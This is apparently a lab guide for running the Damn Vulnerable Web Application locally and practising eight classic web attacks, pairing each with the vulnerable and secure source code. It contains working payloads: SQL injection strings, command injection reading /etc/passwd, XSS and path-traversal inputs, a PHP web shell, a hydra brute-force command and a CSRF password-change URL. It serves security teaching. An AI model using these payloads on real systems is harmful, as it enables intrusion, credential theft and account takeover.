# Damn Vulnerable Web Application (DVWA)

DVWA is a deliberately insecure web application for practising common web vulnerabilities in a safe, legal environment.

> **Warning:** Only run DVWA on isolated/local networks. Never expose it to the internet.

## Launch

```bash
docker compose up -d
```

Open <http://localhost:8080> and log in:

| Field    | Value      |
|----------|------------|
| Username | `admin`    |
| Password | `password` |

On first launch, go to **DVWA Security → Setup / Reset DB** and click **Create / Reset Database**, then log in again.

## Set the Security Level

Go to **DVWA Security** and choose a level:

- **Low** — no protections; ideal for learning the mechanics of each attack.
- **Medium** — basic input filtering; practice bypassing simple defences.
- **High** — stronger filtering; more realistic challenge.
- **Impossible** — secure implementation shown as a reference.

Start on **Low**, understand the vulnerability, then increase the level.

> **Tip for teachers:** Each exercise below includes a command to print the vulnerable source code from inside the container. Use it to walk students through *why* the code is insecure before showing the exploit. You can also compare it with the **Impossible** level to show the secure version.

## Exercises

### 1. SQL Injection

Navigate to **SQL Injection** and enter the following in the User ID field:

```
' OR '1'='1
```

This bypasses the query logic and returns all users. On **Low**, the input is concatenated directly into the SQL query with no sanitisation.

Try extracting the database version:

```
' UNION SELECT null, version() #
```

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/sqli/source/low.php
```

The query concatenates user input directly into the SQL string (`"SELECT ... WHERE user_id = '$id'"`). There is no use of prepared statements or parameterised queries, so an attacker controls the query structure.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/sqli/source/impossible.php
```

### 2. Command Injection

Navigate to **Command Injection**. The form pings a host. Append a shell command:

```
127.0.0.1; cat /etc/passwd
```

The server executes the injected command. On **Medium**, try bypassing with `127.0.0.1 && cat /etc/passwd`.

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/exec/source/low.php
```

The input is passed directly to `shell_exec()` without any sanitisation. The fix is to use an allow-list of valid inputs or escape shell arguments with `escapeshellarg()`.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/exec/source/impossible.php
```

### 3. Reflected XSS

Navigate to **XSS (Reflected)** and enter:

```html
<script>alert('XSS')</script>
```

If an alert box appears, the input is rendered without escaping. On **Medium**, the `<script>` tag is filtered — try:

```html
<img src=x onerror=alert('XSS')>
```

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/xss_r/source/low.php
```

The user input is echoed directly into the HTML response without escaping. The fix is to use `htmlspecialchars()` with `ENT_QUOTES` to encode output.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/xss_r/source/impossible.php
```

### 4. Stored XSS

Navigate to **XSS (Stored)** and submit a guestbook entry with:

```html
<script>alert('Stored XSS')</script>
```

Every user who views the page will trigger the script. This demonstrates the persistence of stored XSS compared to reflected.

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/xss_s/source/low.php
```

User-supplied content is stored in the database and rendered back without escaping. Both input validation *and* output encoding are missing.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/xss_s/source/impossible.php
```

### 5. File Inclusion

Navigate to **File Inclusion** and modify the `page` parameter in the URL:

```
http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd
```

This reads arbitrary files from the server via path traversal.

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/fi/source/low.php
```

The `page` parameter is passed directly to `include()` with no validation. An attacker can traverse the filesystem or include remote files. The fix is to use an allow-list of permitted pages.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/fi/source/impossible.php
```

### 6. File Upload

Navigate to **File Upload** and upload a PHP web shell:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Save it as `shell.php`, upload it, then access:

```
http://localhost:8080/hackable/uploads/shell.php?cmd=id
```

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/upload/source/low.php
```

The server accepts any uploaded file without checking the file type, extension, or content. The fix is to validate MIME types against an allow-list, rename files, and store them outside the web root.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/upload/source/impossible.php
```

### 7. Brute Force

Navigate to **Brute Force**. Use a tool like `hydra` to automate login attempts:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost -s 8080 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/brute/source/low.php
```

There is no rate limiting, account lockout, or CAPTCHA. The query also uses unsanitised input, making it vulnerable to both brute force and SQL injection simultaneously.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/brute/source/impossible.php
```

### 8. CSRF

Navigate to **CSRF**. The password-change form has no anti-CSRF token on **Low**. Craft a URL that changes the password when visited:

```
http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

If a logged-in user clicks this link, their password is changed without their consent.

**View the insecure code:**

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/csrf/source/low.php
```

The form handler does not verify the request origin — there is no anti-CSRF token, no `Referer` check, and no re-authentication. The fix is to include a unique, per-session token that the server validates on each state-changing request.

Compare with the secure version:

```bash
docker exec dvwa cat /var/www/html/vulnerabilities/csrf/source/impossible.php
```

## Teardown

```bash
docker compose down -v
```

The `-v` flag removes the database volume so the next launch starts fresh.
